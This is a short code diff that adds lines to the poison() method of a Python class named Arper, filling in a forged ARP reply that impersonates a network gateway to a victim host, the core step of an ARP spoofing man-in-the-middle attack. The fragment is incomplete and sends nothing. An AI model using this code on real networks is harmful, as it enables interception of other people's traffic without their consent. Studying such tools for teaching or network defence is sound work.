@@ -37,4 +37,8 @@ class Arper():
     def poison(self):
         poison_victim = ARP()
         poison_victim.op = 2
+        poison_victim.psrc = self.gateway
+        poison_victim.pdst = self.victim
+        poison_victim.hwdst = self.victimmac
+        
 
